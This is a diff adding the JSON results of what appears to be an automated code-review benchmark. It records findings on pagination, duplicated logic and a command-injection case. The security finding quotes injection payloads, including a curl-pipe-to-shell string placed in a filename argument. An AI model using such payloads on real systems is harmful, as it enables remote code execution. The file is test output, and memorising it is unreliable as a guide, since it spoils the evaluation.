@@ -1,0 +1,102 @@
+{
+  "confirmation_reruns": [],
+  "invocations": [
+    {
+      "case_id": null,
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "`page()` returns `page_size + 1` items per page `end = offset + page_size + 1` followed by `items[offset:end]`. The slice length is `page_size + 1` whenever enough items remain. The pre-image used `offset + page_size`. Each page returns one more item than requested. With `page_size=10`, page 1 returns items 0\u201310, and page 2 starts at offset 10, so item 10 appears on both pages. Callers get duplicated items and oversized pages.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "end = offset + page_size + 1",
+                    "items[offset:end]",
+                    "page_size + 1",
+                    "offset + page_size"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 4,
+                    "start": 3
+                  },
+                  "path": "app/pagination.py"
+                },
+                "severity": "P1"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "no-op-comment-and-rename",
+            "input_kind": "patch",
+            "produced_findings": [],
+            "status": "executed"
+          },
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "SMS branch duplicates the email branch's message-building logic The new `elif kind == \"sms\"` branch repeats `msg = format_message(user)` from the `email` branch (`app/notify.py:3`). The two branches differ only in the recipient field and the send function. Each new channel will copy the same preamble again. Any change to message construction, such as per-channel formatting or error handling, has to be made in every branch, and the branches can drift apart.",
+                "extra": {
+                  "defect_kind": "duplicated-branch-logic",
+                  "evidence_quotes": [
+                    "elif kind == \"sms\"",
+                    "msg = format_message(user)",
+                    "email",
+                    "app/notify.py:3"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "security-command-injection",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Command injection through `name` in `make_archive` Line 5 builds `cmd = f\"tar -czf {name}.tar.gz data/\"` and line 6 runs it with `subprocess.run(cmd, shell=True, check=True)`. The shell parses `name` as command syntax, and nothing validates or quotes it. For example, `name=\"x; id #\"` or `name=\"$(curl evil|sh)\"` runs the injected command. The previous version passed `name + \".tar.gz\"` as a single argv element with no shell, so it was not exposed to this. Anyone who can influence `name` can execute arbitrary commands with the privileges of the application process. That means remote code execution, data exfiltration of `data/`, and tampering with the backups. Spaces or other metacharacters in `name` would also break the archive path.",
+                "extra": {
+                  "defect_kind": "command-injection",
+                  "evidence_quotes": [
+                    "cmd = f\"tar -czf {name}.tar.gz data/\"",
+                    "subprocess.run(cmd, shell=True, check=True)",
+                    "name",
+                    "name=\"x; id #\"",
+                    "name=\"$(curl evil|sh)\"",
+                    "name + \".tar.gz\""
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 6,
+                    "start": 5
+                  },
+                  "path": "app/backup.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    }
+  ]
+}
